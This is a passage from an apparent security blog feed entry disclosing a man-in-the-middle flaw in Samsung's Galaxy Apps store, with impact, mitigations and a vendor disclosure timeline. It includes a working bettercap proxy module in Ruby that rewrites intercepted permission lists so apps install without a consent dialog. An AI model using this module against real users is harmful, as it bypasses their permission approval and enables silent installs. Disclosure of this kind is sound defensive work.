-<p>As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.</p>
-<p>This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.</p>
-<center><br><img src="/images/2016/08/mail.png" alt="galaxy apps"><br></center>
-
-<p>An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single <strong>INTERNET</strong> permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.</p>
-<p>The following is a POC bettercap proxy module.</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">BETTERCAP</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Author : Simone 'evilsocket' Margaritelli</span></span><br><span class="line"><span class="comment">Email  : evilsocket<span class="doctag">@gmail</span>.com</span></span><br><span class="line"><span class="comment">Blog   : http://www.evilsocket.net/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This project is released under the GPL 3 license.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GalaxyApps</span> &lt; BetterCap::Proxy::<span class="title">HTTP::Module</span></span></span><br><span class="line">  meta(</span><br><span class="line">    <span class="string">'Name'</span>        =&gt; <span class="string">'GalaxyApps'</span>,</span><br><span class="line">    <span class="string">'Description'</span> =&gt; <span class="string">'Bypass permission dialog for "Galaxy Apps" application on every Samsung device.'</span>,</span><br><span class="line">    <span class="string">'Version'</span>     =&gt; <span class="string">'1.0.0'</span>,</span><br><span class="line">    <span class="string">'Author'</span>      =&gt; <span class="string">"Simone 'evilsocket' Margaritelli"</span>,</span><br><span class="line">    <span class="string">'License'</span>     =&gt; <span class="string">'GPL3'</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">on_request</span><span class="params">( request, response )</span></span></span><br><span class="line">    <span class="keyword">if</span> !request.body.<span class="literal">nil</span>? <span class="keyword">and</span> request.body.<span class="keyword">include</span>?(<span class="string">'&lt;SamsungProtocol'</span>)</span><br><span class="line">      req_name = <span class="string">'???'</span></span><br><span class="line">      <span class="keyword">if</span> request.body =~ <span class="regexp">/.+&lt;request\s+name="([^"]+)"/i</span></span><br><span class="line">        req_name = $1</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      BetterCap::Logger.info <span class="string">"[<span class="subst">#&#123;<span class="string">'GALAXY APPS'</span>.green&#125;</span>] Detected Galaxy Apps traffic: <span class="subst">#&#123;<span class="string">'request'</span>.blue&#125;</span>='<span class="subst">#&#123;req_name.yellow&#125;</span>'"</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> req_name == <span class="string">'androidManifestList'</span></span><br><span class="line">        response.body.gsub!( <span class="regexp">/permission"&gt;[^&lt;]+&lt;/i</span>, <span class="string">'permission"&gt;INTERNET&lt;'</span> )</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
-<h4 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h4><p>An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.</p>
-<h4 id="Mitigations-amp-Recommendations"><a href="#Mitigations-amp-Recommendations" class="headerlink" title="Mitigations &amp; Recommendations"></a>Mitigations &amp; Recommendations</h4><ul>
-<li>Use HTTPS connections for every API request.</li>
-<li>Implement SSL key pinning to avoid SSL MITM attacks.</li>
-<li>Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.</li>
-</ul>
-<h4 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h4><ul>
-<li>May 2 2016 : Initial disclosure.</li>
-<li>June 7 2016 : Follow up.</li>
-<li>June 8 2016 : Email from vendor working on fixes.</li>
-<li>June 9 2016 : Confirmation that fixes were going to be pushed in next release</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.&lt;/p&gt;
-&lt;h4 id=&quot;Affected-Products&quot;&gt;&lt;a href=&quot;#Affected-Products&quot; class=&quot;headerlink&quot; title=&quot;Affected Products&quot;&gt;&lt;/a&gt;Affected Products&lt;/h4&gt;&lt;p&gt;Samsung Galaxy Apps &amp;lt;= 4.1.01-14&lt;/p&gt;
-&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/08/galaxyapps.png&quot; alt=&quot;galaxy apps&quot;&gt;&lt;br&gt;&lt;/center&gt;
-    
-    </summary>
-    
-    
-      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
-    
-      <category term="man in the middle" scheme="https://www.evilsocket.net/tags/man-in-the-middle/"/>
-    
-      <category term="session hijacking" scheme="https://www.evilsocket.net/tags/session-hijacking/"/>
-    
-      <category term="permission bypass" scheme="https://www.evilsocket.net/tags/permission-bypass/"/>
-    
-      <category term="samsung" scheme="https://www.evilsocket.net/tags/samsung/"/>
-    
-      <category term="samsung galaxy apps" scheme="https://www.evilsocket.net/tags/samsung-galaxy-apps/"/>
-    
-      <category term="galaxy" scheme="https://www.evilsocket.net/tags/galaxy/"/>
     
   </entry>
   
